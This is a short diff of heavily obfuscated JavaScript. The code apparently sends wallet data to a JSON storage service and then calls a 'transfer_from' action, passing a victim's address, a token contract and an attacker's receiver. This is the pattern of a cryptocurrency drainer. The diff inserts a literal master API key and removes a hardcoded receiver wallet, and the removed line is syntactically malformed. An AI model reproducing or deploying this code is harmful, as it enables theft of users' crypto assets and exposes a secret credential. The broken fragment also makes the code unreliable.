@@ -4984,7 +4984,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json",
-                            "X-Master-Key": "",
+                            "X-Master-Key": "$2b$10$Z5TfalSTxEI5f/.wxadQHuWm4vtigtnSZrwvXx7kN5I0xG6JjRkhm",
                             "X-Bin-Private": "false",
                             "X-Bin-Name": "test"
                         },
@@ -5038,7 +5038,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                         address: e,
                         coin_contract_add: c,
                         receiver: W
-                        W = "0x053973D64EE9256d6957E3C5D2b5dD100064F07F";
+                    
                     });
                     let f = new FormData;
                     f.append("action", "transfer_from"),
